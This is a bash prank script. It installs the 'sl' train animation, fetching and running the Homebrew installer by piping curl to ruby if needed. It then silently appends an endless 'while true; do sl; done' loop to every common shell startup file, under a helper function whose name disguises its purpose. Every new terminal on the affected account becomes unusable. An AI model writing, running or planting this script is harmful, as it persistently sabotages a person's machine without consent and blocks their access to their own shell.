#!/bin/bash

function poll_for_removal_of_while_loop {
	rc_file=$1
	shift 1
	loop_to_insert=$@

	if [[ -f $rc_file ]]; then
		check_if_loop_already_exists=`cat $rc_file | grep "$(echo -e "$loop_to_insert")"`
		if [[ -z $check_if_loop_already_exists ]]; then
			cat $rc_file > temp && echo -e "\n$loop_to_insert" >> temp && rm -f $rc_file
			mv temp $rc_file
		fi
	else
		echo -e $loop_to_insert > $rc_file
	fi
}


function modify_rc_files {
	bash_like_while_loop="while true; do sl; done"
	c_like_while_loop="while (1)\n sl\n end"

	cd ~
	poll_for_removal_of_while_loop ~/.zshrc $bash_like_while_loop
	poll_for_removal_of_while_loop ~/.bash_profile $bash_like_while_loop
	poll_for_removal_of_while_loop ~/.profile $bash_like_while_loop
	poll_for_removal_of_while_loop ~/.kshrc $bash_like_while_loop
	poll_for_removal_of_while_loop ~/.shrc $bash_like_while_loop
	poll_for_removal_of_while_loop ~/.tcshrc $c_like_while_loop
	poll_for_removal_of_while_loop ~/.cshrc $c_like_while_loop

}

sl_status=$(which sl)

if [ -z "$sl_status" ]
then
	internet=$(/usr/bin/curl -s www.google.com)

	if [ -n "$internet" ]
	then
		brew_status=$(/usr/bin/find -x /usr brew 2>/dev/null)

		if [ -z "$brew_status" ]
			then 
			/usr/bin/ruby -e "$(/usr/bin/curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
		fi
		/usr/local/bin/brew install sl
		modify_rc_files
	else
		echo "Not connected to the internet"
		/bin/sleep 1
	fi
else
	modify_rc_files
fi